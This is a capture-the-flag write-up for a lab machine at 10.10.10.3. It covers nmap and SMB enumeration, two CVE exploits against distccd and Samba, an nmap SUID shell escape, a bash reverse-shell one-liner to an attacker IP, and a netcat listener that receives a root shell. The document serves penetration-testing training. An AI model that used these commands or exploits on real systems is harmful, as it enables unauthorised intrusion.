# recon
- ports
```
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```
  - details
```
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```
- ftp:
  - vsftpd 2.3.4
  - empty with `ls -la`
```
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
553 Could not create file.
```
- smb:
  - Samba smbd 3.0.20-Debian
  - [CVE-2007-2447](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script)
```
| smb-enum-shares: 
|   account_used: <blank>
|   \\10.10.10.3\ADMIN$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.10.10.3\IPC$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|   \\10.10.10.3\opt: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.10.10.3\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|   \\10.10.10.3\tmp: 
|     Type: STYPE_DISKTREE
|     Comment: oh noes!
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|_    Anonymous access: READ/WRITE
```
-  distccd v1
   -  [CVE-2004-2687](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)


# foot hold.
should ur path, there is 3 exloit that you can use. if you aim for oscp, dont use metasploit if you dont have too. I choosen to use `CVE-2004-2687` to get foothold. I try to use suid to priv esc to gain root but it did work... 
```
[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/bin/nmap -~> https://gtfobins.github.io/gtfobins/nmap/#suid
------------------------------


[&] Manual Exploitation (Binaries which create files on the system)
------------------------------
[&] Nmap ( /usr/bin/nmap )
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
/usr/bin/nmap --script=$TF

------------------------------
```
just dump
```bash
bash -i >& /dev/tcp/10.10.14.12/6969 0>&1
```
## root
so suid didnt works, I took one step backward and go thru recon's result. I then choose to use `CVE-2007-2447` to gain root access using this script on github https://github.com/amriunix/CVE-2007-2447. it is straight forward, `wget` the exploit and `pip` all requriment. `readme.md` explain how to use the script clearly

```
kali@kali:~/script$nc -nlvp 6969h
listening on [any] 6969 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.3] 52344
whoami
root
```